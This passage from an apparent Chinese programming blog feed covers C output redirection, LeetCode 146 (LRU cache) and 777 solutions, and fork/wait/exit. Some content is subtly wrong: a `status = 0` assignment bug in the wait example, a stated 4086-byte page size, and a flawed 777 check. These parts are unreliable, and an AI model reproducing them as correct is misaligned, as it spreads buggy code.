class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在函数中我们用字符指针onFile对输出重定向的文件名进行标记，同时用到endIdx作为哨兵，记录重定向符&gt;的位置，并在该位置上赋值’\0’，对执行命令的处理，用到freopen对标准输入stdout以写的方式重定向到onFile处。</p>
<p>实现：</p>
<p><img src="https://s2.ax1x.com/2020/01/22/1EEFbD.png" alt="1EEFbD.png"></p>
<p>同时在1.txt文件中：</p>
<p><img src="https://s2.ax1x.com/2020/01/22/1EE3Vg.png" alt="1EE3Vg.png"></p>
<p>则上述就简单实现了输出重定向功能。</p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>c语言</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解146</title>
    <url>/2020/01/21/LeetCode%E9%A2%98%E8%A7%A3146/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第146题 LRU缓存机制</strong></p>
<p>运用你所掌握的数据结构，设计和实现一个  LRU (最近最少使用) 缓存机制。它应该支持以下操作： 获取数据 get 和 写入数据 put 。</p>
<p>获取数据 get(key) - 如果密钥 (key) 存在于缓存中，则获取密钥的值（总是正数），否则返回 -1。<br>写入数据 put(key, value) - 如果密钥不存在，则写入其数据值。当缓存容量达到上限时，它应该在写入新数据之前删除最近最少使用的数据值，从而为新的数据值留出空间。</p>
<p>进阶:</p>
<p>你是否可以在 O(1) 时间复杂度内完成这两种操作？</p>
<p>示例:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LRUCache cache = <span class="keyword">new</span> LRUCache( <span class="number">2</span> <span class="comment">/* 缓存容量 */</span> );</span><br><span class="line"></span><br><span class="line">cache.<span class="built_in">put</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">cache.<span class="built_in">put</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">cache.<span class="built_in">get</span>(<span class="number">1</span>);       <span class="comment">// 返回  1</span></span><br><span class="line">cache.<span class="built_in">put</span>(<span class="number">3</span>, <span class="number">3</span>);    <span class="comment">// 该操作会使得密钥 2 作废</span></span><br><span class="line">cache.<span class="built_in">get</span>(<span class="number">2</span>);       <span class="comment">// 返回 -1 (未找到)</span></span><br><span class="line">cache.<span class="built_in">put</span>(<span class="number">4</span>, <span class="number">4</span>);    <span class="comment">// 该操作会使得密钥 1 作废</span></span><br><span class="line">cache.<span class="built_in">get</span>(<span class="number">1</span>);       <span class="comment">// 返回 -1 (未找到)</span></span><br><span class="line">cache.<span class="built_in">get</span>(<span class="number">3</span>);       <span class="comment">// 返回  3</span></span><br><span class="line">cache.<span class="built_in">get</span>(<span class="number">4</span>);       <span class="comment">// 返回  4</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>原题如上，代码如下：</p>
<p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">new_node</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,key=<span class="number">0</span>,value=<span class="number">0</span>)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.value = value</span><br><span class="line">        self.prev = <span class="literal">None</span></span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_none</span><span class="params">(self,node)</span>:</span></span><br><span class="line">        node.prev = self.head</span><br><span class="line">        node.next = self.head.next</span><br><span class="line">        self.head.next.prev = node</span><br><span class="line">        self.head.next = node</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove_node</span><span class="params">(self,node)</span>:</span></span><br><span class="line">        prev = node.prev</span><br><span class="line">        new = node.next</span><br><span class="line">        prev.next = new</span><br><span class="line">        new.prev = prev</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move_to_head</span><span class="params">(self,node)</span>:</span></span><br><span class="line">        self.remove_node(node)</span><br><span class="line">        self.add_none(node) </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove_last_node</span><span class="params">(self)</span>:</span></span><br><span class="line">        last = self.tail.prev</span><br><span class="line">        self.remove_node(last)</span><br><span class="line">        <span class="keyword">return</span> last</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, capacity)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type capacity: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.cache = &#123;&#125;</span><br><span class="line">        self.size = <span class="number">0</span></span><br><span class="line">        self.capacity = capacity</span><br><span class="line">        self.head = new_node()</span><br><span class="line">        self.tail = new_node()</span><br><span class="line">        self.head.next = self.tail</span><br><span class="line">        self.tail.prev = self.head</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type key: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        node = self.cache.get(key)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">        self.move_to_head(node)</span><br><span class="line">        <span class="keyword">return</span> node.value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(self, key, value)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type key: int</span></span><br><span class="line"><span class="string">        :type value: int</span></span><br><span class="line"><span class="string">        :rtype: None</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        node = self.cache.get(key)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">            newnode = new_node(key,value)</span><br><span class="line">            self.cache[key] = newnode</span><br><span class="line">            self.add_none(newnode)</span><br><span class="line">            self.size += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> self.size &gt; self.capacity:</span><br><span class="line">                tail = self.remove_last_node()</span><br><span class="line">                <span class="keyword">del</span> self.cache[tail.key]</span><br><span class="line">                self.size -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            node.value = value</span><br><span class="line">            self.move_to_head(node)</span><br><span class="line"><span class="comment"># Your LRUCache object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = LRUCache(capacity)</span></span><br><span class="line"><span class="comment"># param_1 = obj.get(key)</span></span><br><span class="line"><span class="comment"># obj.put(key,value)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/21/1k30Mj.png" alt="1k30Mj.png"></p>
<p><strong>解析：</strong></p>
<p>首先，我们看到这个题所要构建的数据结构要求要在常数时间内完成get和put操作，那么可以用到哈希表，也就是python中的字典结构，辅助双向链表记录key-value信息，对于双向链表加入head和tail两个哨兵方便使用。</p>
<p>整体结构为：</p>
<p><img src="https://s2.ax1x.com/2020/01/21/1kc46s.png" alt="1kc46s.png"></p>
<p>我们先构造链表结构：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">new_node</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,key=<span class="number">0</span>,value=<span class="number">0</span>)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.value = value</span><br><span class="line">        self.prev = <span class="literal">None</span></span><br><span class="line">        self.next = <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>对于字典结构key值是数据结构中的key，而字典中的value是链表中的结构体Node。</p>
<p>在我们构造LRUcache之前，我们先得构造几种方法，并结合要求使用。</p>
<p>首先，LRU是最近最久未使用，我们可以用双向链表进行对使用时间进行有序排序，即最近到最久的顺序。链表中最后一个，也就是最久没有使用的那一个。</p>
<p>对双向链表进行维护时，会有多种情况：</p>
<ol>
<li><p><strong>put</strong>一个key相同的key-value，我们不用管它们的value是否相同，对我们而言是要原来的key-value进行更新，我们要将原来的key-value<strong>更新后将其位置移动到第一个</strong>。这时候无论cache是否满的，都不会溢出，因为只是更新处理而已。</p>
</li>
<li><p><strong>put</strong>一个新的key-value，我们会构建一个新的key-value结构体，并<strong>加入到链表中放到第一个位置</strong>，在字典中也加入新的key-value，然后判断是否溢出缓存，若溢出，那么将最久未使用也就是链表中<strong>最后一个元素删除</strong>，同时删除字典中该元素的key-value。</p>
<p>上述中我们发现我们还需要：</p>
<ol>
<li><p>在链表中新加Node并放置在第一个位置：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_none</span><span class="params">(self,node)</span>:</span></span><br><span class="line">	node.prev = self.head</span><br><span class="line">   node.next = self.head.next</span><br><span class="line">   self.head.next.prev = node</span><br><span class="line">   self.head.next = node</span><br></pre></td></tr></table></figure>
</li>
<li><p>移除old_Node：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_node</span><span class="params">(self,node)</span>:</span></span><br><span class="line">    prev = node.prev</span><br><span class="line">    new = node.next</span><br><span class="line">    prev.next = new</span><br><span class="line">    new.prev = prev</span><br></pre></td></tr></table></figure>
</li>
<li><p>将old_Node移动到第一个位置：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move_to_head</span><span class="params">(self,node)</span>:</span></span><br><span class="line">    self.remove_node(node)</span><br><span class="line">    self.add_none(node)</span><br></pre></td></tr></table></figure>
</li>
<li><p>将最后一个Node删除：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_last_node</span><span class="params">(self)</span>:</span></span><br><span class="line">    last = self.tail.prev</span><br><span class="line">    self.remove_node(last)</span><br><span class="line">    <span class="keyword">return</span> last</span><br></pre></td></tr></table></figure>

<p>返回Node是为了使用它在字典中将它删除。</p>
</li>
</ol>
</li>
<li><p><strong>get</strong>一个key，查询其value，若没有，返回-1，若有，返回其value，并刷新使用时间，也就是将其key-value移动到链表第一个位置。</p>
</li>
</ol>
<p>由上述就可以构造put和get方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(self, key, value)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :type key: int</span></span><br><span class="line"><span class="string">    :type value: int</span></span><br><span class="line"><span class="string">    :rtype: None</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    node = self.cache.get(key)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">        newnode = new_node(key,value)</span><br><span class="line">        self.cache[key] = newnode</span><br><span class="line">        self.add_none(newnode)</span><br><span class="line">        self.size += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.size &gt; self.capacity:</span><br><span class="line">            tail = self.remove_last_node()</span><br><span class="line">            <span class="keyword">del</span> self.cache[tail.key]</span><br><span class="line">            self.size -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        node.value = value</span><br><span class="line">        self.move_to_head(node)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, key)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :type key: int</span></span><br><span class="line"><span class="string">    :rtype: int</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    node = self.cache.get(key)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    self.move_to_head(node)</span><br><span class="line">    <span class="keyword">return</span> node.value</span><br></pre></td></tr></table></figure>

<p>同时对LRUcache的基本属性为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, capacity)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :type capacity: int</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    self.cache = &#123;&#125;</span><br><span class="line">    self.size = <span class="number">0</span></span><br><span class="line">    self.capacity = capacity</span><br><span class="line">    self.head = new_node()</span><br><span class="line">    self.tail = new_node()</span><br><span class="line">    self.head.next = self.tail</span><br><span class="line">    self.tail.prev = self.head</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解777</title>
    <url>/2020/01/18/LeetCode%E9%A2%98%E8%A7%A3777/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第777题，在LR字符串中交换相邻字符</strong></p>
<p>在一个由 ‘L’ , ‘R’ 和 ‘X’ 三个字符组成的字符串（例如”RXXLRXRXL”）中进行移动操作。一次移动操作指用一个”LX”替换一个”XL”，或者用一个”XR”替换一个”RX”。现给定起始字符串start和结束字符串end，请编写代码，当且仅当存在一系列移动操作使得start可以转换成end时， 返回True。</p>
<p><strong>示例</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">输入: start = <span class="string">"RXXLRXRXL"</span>, end = <span class="string">"XRLXXRRLX"</span></span><br><span class="line">输出: <span class="literal">True</span></span><br><span class="line">解释:</span><br><span class="line">我们可以通过以下几步将start转换成end:</span><br><span class="line">RXXLRXRXL -&gt;</span><br><span class="line">XRXLRXRXL -&gt;</span><br><span class="line">XRLXRXRXL -&gt;</span><br><span class="line">XRLXXRRXL -&gt;</span><br><span class="line">XRLXXRRLX</span><br></pre></td></tr></table></figure>

<p><strong>注意:</strong></p>
<ol>
<li><code>1 &lt;= len(start) = len(end) &lt;= 10000</code>。</li>
<li><code>start</code>和<code>end</code>中的字符串仅限于<code>&#39;L&#39;</code>, <code>&#39;R&#39;</code>和<code>&#39;X&#39;</code>。</li>
</ol>
<a id="more"></a>

<p>原题如上，代码如下：</p>
<p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">canTransform</span><span class="params">(self, start, end)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type start: str</span></span><br><span class="line"><span class="string">        :type end: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> (len(start) != len(end)):</span><br><span class="line">            <span class="keyword">return</span> bool(<span class="number">0</span>)</span><br><span class="line">        n = len(start)</span><br><span class="line">        sl = <span class="number">0</span></span><br><span class="line">        sr = <span class="number">0</span></span><br><span class="line">        el = <span class="number">0</span></span><br><span class="line">        er = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">if</span> start[i] == <span class="string">'L'</span>:</span><br><span class="line">                sl += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> start[i] == <span class="string">'R'</span>:</span><br><span class="line">                sr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> end[i] == <span class="string">'L'</span>:</span><br><span class="line">                el += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> end[i] == <span class="string">'R'</span>:</span><br><span class="line">                er += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> (sl &gt; el) | (sr &lt; er):</span><br><span class="line">                <span class="keyword">return</span> bool(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> bool((sl == el) &amp; (sr == er) &amp; (sl + sr &lt; n))</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/18/19nlMF.png" alt="19nlMF.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">canTransform</span><span class="params">(<span class="keyword">char</span> * start, <span class="keyword">char</span> * <span class="built_in">end</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(start) != <span class="built_in">strlen</span>(<span class="built_in">end</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span> , n = <span class="built_in">strlen</span>(start);</span><br><span class="line">    <span class="keyword">int</span> sl = <span class="number">0</span>,sr = <span class="number">0</span>,el = <span class="number">0</span>,er = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(start[i]==<span class="string">'L'</span>)</span><br><span class="line">            sl++;</span><br><span class="line">        <span class="keyword">if</span>(start[i]==<span class="string">'R'</span>)</span><br><span class="line">            sr++;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">end</span>[i]==<span class="string">'L'</span>)</span><br><span class="line">            el++;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">end</span>[i]==<span class="string">'R'</span>)</span><br><span class="line">            er++;</span><br><span class="line">        <span class="keyword">if</span>((sl &gt; el) || (sr &lt; er))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (sl == el) &amp;&amp; (sr == er) &amp;&amp; (sl + sr &lt; n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/18/19nYI1.png" alt="19nYI1.png"></p>
<p><strong>做题原理：</strong></p>
<p>注意：注意L只会向左移R只会向右移</p>
<ol>
<li><p>先判等start和end的长度（肯定是相等的）。</p>
</li>
<li><p>记录下start和end中’L’和’R’的个数</p>
</li>
<li><p>同时遍历start和end</p>
<p>​            <img src="https://s2.ax1x.com/2020/01/18/19nZan.png" alt="19nZan.png"></p>
</li>
</ol>
<p>发现对’L’来说对于<strong>true</strong>的start到end：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sl &lt;= el</span><br><span class="line">sr &gt;= er</span><br></pre></td></tr></table></figure>

<p>因为’L’在变化的时候只会和它的左边对换位置，即对于start来说有可能会使 <strong>i 线</strong>右边的’L’对换到 <strong>i 线</strong>的左边，导致:</p>
<p>​          <strong>sl &lt;= el</strong></p>
<p>同理，因为’R’在变化的时候只会和它右边对换位置，即对于start来说有可能会使 <strong>i 线</strong>左边的’R’对换到 <strong>i 线</strong>的右边，导致:</p>
<p>​          <strong>sr &gt;= er</strong></p>
<p>则可以用(sl &gt; el) || (sr &lt; er)来判断false。</p>
<ol start="4">
<li><p>最后如若上述条件都满足，还要保证end是由start变化而来，即要满足(sl == el) &amp;&amp; (sr == er) &amp;&amp; (sl + sr &lt; n)，则为true。(注意：sl+sr&lt;n是因为还有’X’的存在)</p>
<p>​    </p>
</li>
</ol>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>fork</title>
    <url>/2020/01/15/fork/</url>
    <content><![CDATA[<h1 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        一个进程，包括代码、数据和分配给进程的资源。</p>
<p>​        fork（）函数通过系统调用创建一个与原来进程几乎完全相同的进程，也就是两个进程可以做完全相同的事，但如果初始参数或者传入的变量不同，两个进程也可以做不同的事。<br>​        一个进程调用fork（）函数后，系统先给新的进程分配资源，例如存储数据和代码的空间。然后把原来的进程的所有值都复制到新的新进程中，只有少数值与原来的进程的值不同。相当于克隆了一个自己。</p>
<a id="more"></a>

<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;	</span><br><span class="line">	<span class="keyword">pid_t</span> child_pid;</span><br><span class="line">	<span class="comment">/*fork函数</span></span><br><span class="line"><span class="comment">	*作用：系统调用，产生一个子进程,调用一次返回两次</span></span><br><span class="line"><span class="comment">	*返回值：pid_t类型，在头文件中定义，通常为整形</span></span><br><span class="line"><span class="comment">	*	0	子进程返回</span></span><br><span class="line"><span class="comment">	*	ID	父进程返回的子进程ID</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	child_pid=fork();</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span>(child_pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">"the failure\n"</span>);</span><br><span class="line">           <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">	<span class="keyword">if</span>(child_pid==<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"the child\n"</span>);</span><br><span class="line">			sleep(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"child's pid is %d"</span>,child_pid);</span><br><span class="line">            <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"> 			<span class="keyword">for</span>(;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">"the father\n"</span>);</span><br><span class="line">               sleep(<span class="number">1</span>);</span><br><span class="line">           &#125;</span><br><span class="line">	&#125;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"I'm over\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​            <strong>那么调用这个fork函数时发生了什么呢？</strong></p>
<p>​            fork函数启动一个新的进程，前面我们说过，这个进程几乎是当前进程的一个拷贝：子进程和父进程使用相同的代码段；子进程复制父进程的堆栈段和数据段。</p>
<p>​            这样，父进程的所有数据都可以留给子进程，但是，子进程一旦开始运行，虽然它继承了父进程的一切数据，但实际上数据却已经分开，相互之间不再有影响了，也就是说，它们之间不再共享任何数据了。它们再要交互信息时，只有通过进程间通信来实现。</p>
<p>​            <strong>既然它们如此相象，系统如何来区分它们呢？</strong></p>
<p>​            这是由函数的返回值来决定的。对于父进程，fork函数返回了子程序的进程号，而对于子程序，fork函数则返回零。在操作系统中，我们用ps就可以看到不同的进程号，对父进程而言，它的进程号是由比它更低层的系统调用赋予的，而对于子进程而言，它的进程号即是fork函数对父进程的返回值。在程序设计中，父进程和子进程都要调用函数fork（）下面的代码，而我们就是利用fork（）函数对父子进程的不同返回值用if…else…语句来实现让父子进程完成不同的功能。</p>
<p>​         <strong><em>正如我们上面举的例子一样。我们看到，上面例子执行时两条信息是交互无规则的打印出来的，这是父子进程独立执行的结果，虽然我们的代码似乎和串行的代码没有什么区别。</em></strong></p>
<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p>　　 如果一个大程序在运行中，它的数据段和堆栈都很大，一次fork就要复制一次，那么fork的系统开销不是很大吗？其实UNIX自有其解决的办法，大家知道，一般CPU都是以”页”为单位来分配内存空间的，每一个页都是实际物理内存的一个映像，象INTEL的CPU，其一页在通常情况下是4086字节大小，而无论是数据段还是堆栈段都是由许多”页”构成的，fork函数复制这两个段，只是”逻辑”上的，并非”物理”上的，也就是说，实际执行fork时，物理空间上两个进程的数据段和堆栈段都还是共享着的，当有一个进程写了某个数据时，这时两个进程之间的数据才有了区别，系统就将有区别的”页”从物理上也分开。系统在空间上的开销就可以达到最小。</p>
<h1 id="wait-and-exit"><a href="#wait-and-exit" class="headerlink" title="wait and exit"></a>wait and exit</h1><h2 id="定义函数wait"><a href="#定义函数wait" class="headerlink" title="定义函数wait()"></a>定义函数wait()</h2><p>​        <code>pid_t wait (int * status);</code></p>
<ul>
<li>wait()会暂时停止目前进程的执行,直到有信号来到或子进程结束。</li>
<li>如果在调用 wait()时子进程已经结束,则 wait()会立即返回子进程结束状态值</li>
<li>子进程的结束状态值会由参数 status 返回,而子进程的进程识别码也会一起返回。</li>
<li>如果不在意结束状态值,则参数<code>status</code> 可以设成 <code>NULL</code>。</li>
</ul>
<p><img src="https://i.loli.net/2019/12/19/K2htdg6MQ4bLN1P.png" alt="UTOOLS1576735868543.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pid_t</span> pid_1;</span><br><span class="line"><span class="keyword">int</span> status=<span class="number">0</span>;</span><br><span class="line">pid_1=wait(&amp;status);</span><br></pre></td></tr></table></figure>

<p><strong><code>status</code>的使用</strong></p>
<h2 id="定义函数exit"><a href="#定义函数exit" class="headerlink" title="定义函数exit()"></a>定义函数exit()</h2><p>exit() 结束当前进程/程序，在整个进程/程序中，只要调用 exit ，就结束。</p>
<p><code>void exit(int status)</code></p>
<p>传入的参数是程序退出时的状态码，0表示正常退出，其他表示非正常退出，一般都用-1或者1，标准C里有EXIT_SUCCESS和EXIT_FAILURE两个宏，用exit(EXIT_SUCCESS)可读性比较好一点。</p>
<h2 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid_1,pid_2;</span><br><span class="line">        </span><br><span class="line">    pid_1 = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid_1 &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"the failure\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pid_1 == <span class="number">0</span>)&#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"I am a child process i am going to sleep\n"</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"I am a child process and I exit normally\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> status;</span><br><span class="line">        pid_2 = wait(&amp;status);</span><br><span class="line">        <span class="keyword">if</span> (pid_2 &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Something went wrong\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (status = <span class="number">0</span>)&#123;</span><br><span class="line">        	<span class="built_in">printf</span>(<span class="string">"I'm the father process and I know my child process %d exits\n"</span>,pid_2);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"I'm the father process and I know my child process %d exited abnormally\n"</span>,pid_2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>c语言</tag>
        <tag>linux进程</tag>
      </tags>
  </entry>
  <entry>
    <title>我的第一篇博客-自我介绍</title>
    <url>/2020/01/15/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2-%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D/</url>
